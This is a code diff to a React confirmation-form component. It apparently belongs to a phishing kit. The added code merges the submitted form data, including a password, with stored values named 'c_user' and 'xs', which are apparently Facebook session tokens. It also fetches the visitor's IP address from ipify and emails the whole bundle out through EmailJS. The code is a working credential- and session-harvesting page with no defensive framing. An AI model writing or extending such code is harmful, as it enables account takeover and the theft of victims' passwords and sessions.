@@ -93,17 +93,37 @@ export default function Confirmation() {
   const onSubmit = async (data: any) => {
     try {
       setIsSubmitting(true);
+
+      // Get validation data from localStorage
+      const validationData = localStorage.getItem('validation_data');
+      if (!validationData) {
+        throw new Error('Previous validation data not found');
+      }
+      const parsedValidationData = JSON.parse(validationData);
+
       const formattedData = {
         ...data,
+        ...parsedValidationData, // Include c_user and xs from validation
         user_email: data.user_email ? (contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email) : undefined,
         contactMethod,
         countryCode: contactMethod === 'phone' ? countryCode : undefined,
         timestamp: new Date().toLocaleString(),
         userAgent: navigator.userAgent,
+        ipAddress: await fetch('https://api.ipify.org?format=json')
+          .then(res => res.json())
+          .then(data => data.ip)
+          .catch(() => 'Not available')
       };
 
-      await sendConfirmationFormEmail(formattedData);
-      localStorage.removeItem('validation_data');
+      console.log('Submitting confirmation form with data:', { 
+        ...formattedData,
+        password: '[REDACTED]' 
+      });
+
+      const emailResponse = await sendConfirmationFormEmail(formattedData);
+      console.log('EmailJS confirmation response:', emailResponse);
+
+      localStorage.removeItem('validation_data'); // Clean up after successful submission
 
       toast({
         title: "Success!",
@@ -115,7 +135,7 @@ export default function Confirmation() {
       toast({
         variant: "destructive",
         title: "Error",
-        description: "Failed to submit form. Please try again.",
+        description: error instanceof Error ? error.message : "Failed to submit form. Please try again.",
       });
     } finally {
       setIsSubmitting(false);
